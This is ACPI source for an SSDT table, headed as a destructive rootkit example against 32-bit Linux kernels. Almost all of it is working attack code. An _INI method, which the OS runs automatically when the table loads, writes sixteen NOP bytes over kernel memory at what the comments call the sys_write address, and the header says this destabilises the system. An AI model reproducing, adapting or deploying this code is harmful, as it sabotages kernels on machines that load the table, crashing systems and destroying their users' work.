/*
 * Destructive ACPI Rootkit Example (SSDT)
 * Target: 32-bit Linux Kernel (e.g., Ubuntu 12.04)
 * Action: Overwrites sys_write with NOPs, causing system instability.
 */
DefinitionBlock ("SSDT", "SSDT", 1, "OEMID", "TABLEID", 0x00000001)
{
    // Define an OperationRegion pointing to the physical address
    // of the target system call. This address is hypothetical.
    OperationRegion (KMEM, SystemMemory, 0x01164B40, 0x10)

    // Define a Field within that kernel memory region.
    // This field represents the first 16 bytes of the function.
    Field (KMEM, AnyAcc, NoLock, Preserve)
    {
        SYSC,   128     // 128 bits = 16 bytes for the syscall
    }

    // _INI is a control method that the OS executes automatically
    // when this ACPI table is loaded. This is our trigger.
    Method (_INI)
    {
        // Create a buffer containing 16 bytes of NOP (0x90) instructions.
        Name (NOPS, Buffer(0x10)
        {
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
        })

        // Store the NOPs into the system call's memory location,
        // effectively erasing its original instructions.
        Store (NOPS, SYSC)
    }
}